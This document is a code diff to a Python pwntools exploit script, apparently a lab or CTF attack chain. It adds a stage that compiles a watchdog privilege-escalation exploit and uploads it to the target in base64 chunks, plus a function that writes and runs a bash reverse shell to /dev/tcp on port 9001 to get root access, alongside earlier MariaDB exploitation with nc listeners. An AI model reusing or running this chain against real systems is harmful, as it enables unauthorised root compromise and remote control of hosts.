@@ -7,6 +7,8 @@ import socketserver
 import threading
 import os
 
+from base64 import b64encode
+
 context.log_level = "debug"
 
 def create_server():
@@ -44,14 +46,32 @@ def get_exploit_files(conn):
 
 def mariadb_exploit(conn1, conn2):
     conn2.sendline("nc -lnvp 9000")
-    input('[!] triggering exploit')
     conn1.sendline(f"python3 /tmp/mdb_exploit.py -H {MARIADB_RHOST} -l {WEBSERVER_RHOST}")
-    conn1.recvrepeat(timeout=10)
+    conn1.recvrepeat(timeout=6)
+
+def watchdog_exploit(conn):
+    system("musl-gcc -Os -static -s -o wexp watchdog_exploit.c")
+    system("base64 wexp > wexp.b64")
+    watchdog = open("wexp.b64", "r").read().split("\n")
+    for line in watchdog:
+        conn.sendline(f"echo {line} >> /tmp/wexp.b64")
+    conn.sendline("base64 -d /tmp/wexp.b64 > /tmp/wexp")
+    conn.sendline("chmod +x /tmp/wexp")
+
+def root_revshell(conn1, conn2):
+    conn1.sendline("nc -lnvp 9001")
+    payload = f"#!/bin/bash\nsh -i >&/dev/tcp/{WEBSERVER_RHOST}/9001 0>&1".encode()
+    conn2.sendline(f"echo {b64encode(payload).decode()} | base64 -d > /tmp/revshell.sh")
+    conn2.sendline("chmod +x /tmp/revshell.sh")
+    conn2.sendline(f"/tmp/wexp /tmp/revshell.sh")
 
 if __name__ == "__main__":
     conn1, conn2 = web_exploit(listen(9999), listen(9998))
     create_server()
     get_exploit_files(conn1)
     mariadb_exploit(conn1, conn2)
+    watchdog_exploit(conn2)
+    root_revshell(conn1, conn2)
 
-    conn2.interactive()
+    context.log_level = 'debug'
+    conn1.interactive()
